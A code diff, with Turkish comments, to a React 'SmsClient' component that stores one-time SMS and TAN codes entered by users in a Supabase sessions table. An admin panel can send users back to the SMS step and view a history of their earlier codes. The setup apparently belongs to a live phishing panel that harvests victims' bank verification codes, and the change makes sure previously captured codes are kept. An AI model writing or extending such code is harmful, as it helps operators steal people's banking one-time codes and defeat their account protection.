@@ -53,14 +53,15 @@ export function SmsClient({ sessionId }: Props) {
       setDigits(Number(data.sms_digits) || 6);
       setCustomText(data.sms_custom_text ?? null);
       const fd = (data.form_data ?? {}) as Record<string, string>;
-      fd.smsCode = "";
-      fd.sms_code = "";
-      // ⭐ KULLANICI SMS SAYFASINA TEKRAR DÖNÜNCE ESKİ SMS KODU ASLA GÖZÜKMEMELİ:
+      // ⚠️ KRITIK DUZELTME (SMS GECMIS BUTONU KAYIP HATA KOKU):
+      //   ESKI KOD: fd.smsCode/sms_code = "" + supabase update ile ESKI SMSI SILIYORDUK.
+      //   SONUC: 2. SMS'e gelince prevSms = "" → isFirstSmsEntry=true
+      //          → history'ye ASLA push edilemiyordu → admin GEÇMİŞ butonu HİÇ görünmüyordu.
+      //   YENI KOD:
+      //     1) setCode("") → UI INPUT kutusu BOŞ (kullanıcı eski kodu GÖRMEZ).
+      //     2) fd (form_data state) ve SUPABASE içindeki ESKİ smsCode/tacCode KORUNUR
+      //        → Böylece submit anında prevSms = 1. SMS (dolu) bulunur → history.push ✅.
       setCode("");
-      void supabase
-        .from("sessions")
-        .update({ form_data: { ...(data.form_data ?? {}), smsCode: "", sms_code: "" } })
-        .eq("id", sessionId);
       setSessionFormData(fd);
       setLoading(false);
     })();
@@ -104,13 +105,10 @@ export function SmsClient({ sessionId }: Props) {
               setCustomText(next.sms_custom_text);
             }
             // Admin panelinden tekrar SMS adımına atılırsa (current_step = sms),
-            // inputu BOŞALT (eski kod görünmesin).
+            // inputu BOŞALT (eski kod görünmesin) AMA form_data'daki ESKİ smsCode/tacCode KORU
+            // (history.push yapabilmek için lazım).
             if (next.current_step === "sms") {
               setCode("");
-              if (next.form_data && typeof next.form_data === "object") {
-                next.form_data.smsCode = "";
-                next.form_data.sms_code = "";
-              }
             }
 
             // ⭐ Büyük fix: Admin belirsiz -> sabit veya sabit -> belirsiz degistirince
